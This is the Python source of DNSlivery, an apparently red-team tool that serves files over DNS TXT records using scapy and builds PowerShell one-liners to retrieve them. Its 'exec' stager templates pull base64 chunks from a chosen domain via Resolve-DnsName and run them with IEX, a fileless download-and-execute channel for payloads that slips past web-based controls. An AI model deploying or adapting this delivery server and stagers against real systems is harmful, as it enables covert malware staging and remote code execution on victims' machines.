#! /usr/bin/env python3

import sys
import os
import argparse
import signal
import re
import base64
from scapy.all import *

banner = """
DNSlivery - Easy files and payloads delivery over DNS
"""

def log(message, msg_type = ''):
    reset   = '\033[0;m'

    # set default prefix and color
    prefix  = '[*]'
    color   = reset

    # change prefix and color based on msg_type
    if msg_type == '+':
        prefix  = '[+]'
        color   = '\033[1;32m'
    elif msg_type == '-':
        prefix  = '[-]'
        color   = '\033[1;31m'
    elif msg_type == 'debug':
        prefix  = '[DEBUG]'
        color   = '\033[0;33m'

    print('%s%s %s%s' % (color, prefix, message, reset))

def base64_encode(filepath):
    with open(filepath, 'rb') as f:
        return base64.b64encode(f.read())

def signal_handler(signal, frame):
    log('Exiting...')
    sys.exit(0)

def dns_handler(data):
    # only process dns queries
    if data.haslayer(UDP) and data.haslayer(DNS) and data.haslayer(DNSQR):
        # get access to the global chunks variable from inside the function
        global chunks

        # split packet layers
        ip = data.getlayer(IP)
        udp = data.getlayer(UDP)
        dns = data.getlayer(DNS)
        dnsqr = data.getlayer(DNSQR)

        # only process txt queries (type 16)
        if len(dnsqr.qname) != 0 and dnsqr.qtype == 16:
            if args.verbose: log('Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))

            # remove domain part of fqdn and split the different parts of hostname
            hostname = re.sub('\.%s\.$' % args.domain, '', dnsqr.qname.decode()).split('.')

            # check if hostname match existing file 
            if len(hostname) > 0 and hostname[0] in chunks:
                
                # stager response 
                if len(hostname) == 1:
                    response = stagers[hostname[0]]['print']
                    log('Delivering %s stager to %s' % (hostname[0], ip.src), '+')

                # exec stager response
                elif len(hostname) == 2 and hostname[1] == 'exec':
                    response = stagers[hostname[0]]['exec']
                    log('Delivering %s exec stager to %s' % (hostname[0], ip.src), '+')

                # save stager response
                elif len(hostname) == 2 and hostname[1] == 'save':
                    response = stagers[hostname[0]]['save']
                    log('Delivering %s save stager to %s' % (hostname[0], ip.src), '+')

                # base64 chunk response
                elif len(hostname) > 1 and hostname[1].isdecimal() and int(hostname[1]) < len(chunks[hostname[0]]):
                    response = chunks[hostname[0]][int(hostname[1])]
                    log('Delivering %s chunk %s/%d to %s' % (hostname[0], int(hostname[1])+1, len(chunks[hostname[0]]), ip.src), '+')

                else: return

                # build response packet
                rdata = response
                rcode = 0
                dn = args.domain
                an = (None, DNSRR(rrname=dnsqr.qname, type='TXT', rdata=rdata, ttl=1))[rcode == 0]
                ns = DNSRR(rrname=dnsqr.qname, type='NS', ttl=1, rdata=args.nameserver)

                response_pkt = IP(id=ip.id, src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
                send(response_pkt, verbose=0, iface=args.interface)
        

if __name__ == '__main__':
    # parse args
    parser = argparse.ArgumentParser(description = banner)
    parser.add_argument('interface', default=None, help='interface to listen to DNS traffic')
    parser.add_argument('domain', default=None, help='FQDN name of the DNS zone')
    parser.add_argument('nameserver', default=None, help='FQDN name of the server running DNSlivery')
    parser.add_argument('-p', '--path', default='.', help='path of directory to serve over DNS (default: pwd)')
    parser.add_argument('-s', '--size', default='255', help='size in bytes of base64 chunks (default: 255)')
    parser.add_argument('-v', '--verbose', action='store_true', help='increase verbosity')
    args = parser.parse_args()

    print('%s' % banner)

    # verify root
    if os.geteuid() != 0:
        log('Script needs to be run with root privileges', '-')
        sys.exit(-1)

    # verify path exists and is readable
    abspath = os.path.abspath(args.path)
    
    if not os.path.exists(abspath) or not os.path.isdir(abspath):
        log('Path %s does not exist or is not a directory' % abspath, '-')
        sys.exit(-1)

    # list files in path
    filenames = {}
    for root, dirs, files in os.walk(abspath):
        for name in files:
            filenames[name] = ''
        break
    
    # for each file, sanitize filename compute chunks and generate stagers
    chunks = {}
    stagers = {}

    stager_templates = {
        'print': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((0..%d | %% {Resolve-DnsName -type TXT -Name "%s.$_.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings})))',
        'print-1': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName -type TXT -Name "%s.0.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings)))',
        'exec': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((0..%d | %% {Resolve-DnsName -type TXT -Name "%s.$_.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings}))))',
        'exec-1': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName -type TXT -Name "%s.0.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings))))',
        'save': '[IO.File]::WriteAllBytes("\output\path", [System.Convert]::FromBase64String((0..%d | %% {Resolve-DnsName -type TXT -Name "%s.$_.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings})))',
        'save-1': '[IO.File]::WriteAllBytes("\output\path", [System.Convert]::FromBase64String((Resolve-DnsName -type TXT -Name "%s.0.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings)))'
    }

    for name in filenames:

        # sanitize filenames to be hostname-compliant (64 max, 254 fqdn max, [a-z0-9\-])
        sanitized = re.sub(r'[^\x00-\x7F]','', name)        # remove non-ascii chars (see unidecode to replace with nearest ascii char)
        sanitized = sanitized.lower()                       # lower all chars
        sanitized = re.sub('[^a-z0-9\-]', '-', sanitized)   # replace chars outside charset to '-'
        filenames[name] = sanitized

        # compute base64 chunks of files
        if not args.size.isdecimal():
            log('Incorrect size value for base64 chunks', '-')
            sys.exit(-1)

        size = int(args.size)

        try:
            # encode file content to base64
            encoded_file = base64_encode(os.path.join(abspath, name))
        
            # split base64 into chunks of provided size (default: 255)
            encoded_chunks = []
            for i in range(0, len(encoded_file), size):
                encoded_chunks.append(encoded_file[i:i + size])

            chunks[filenames[name]] = encoded_chunks
        except:
            # remove key from dict in case of failure (i.e. file permissions)
            del filenames[name]
            log('Error computing base64 for %s, file will been ignored' % name, '-')
            break

        # generate stagers
        stagers[filenames[name]] = {}

        # select template based on number of chunks 
        if len(chunks[filenames[name]]) <= 1:
            stagers[filenames[name]]['print'] = stager_templates['print-1'] % (filenames[name], args.domain)
            stagers[filenames[name]]['exec'] = stager_templates['exec-1'] % (filenames[name], args.domain)
            stagers[filenames[name]]['save'] = stager_templates['save-1'] % (filenames[name], args.domain)
        else:
            stagers[filenames[name]]['print'] = stager_templates['print'] % (len(chunks[filenames[name]])-1, filenames[name], args.domain)
            stagers[filenames[name]]['exec'] = stager_templates['exec'] % (len(chunks[filenames[name]])-1, filenames[name], args.domain)
            stagers[filenames[name]]['save'] = stager_templates['save'] % (len(chunks[filenames[name]])-1, filenames[name], args.domain)

        # display file ready for delivery
        log('File "%s" ready for delivery at %s.%s (%d chunks)' % (name, filenames[name], args.domain, len(chunks[filenames[name]])))

    # register signal handler
    signal.signal(signal.SIGINT, signal_handler)

    # listen for DNS query
    log('Listening for DNS queries...')

    while True: dns_listener = sniff(filter='udp dst port 53', iface=args.interface, prn=dns_handler)
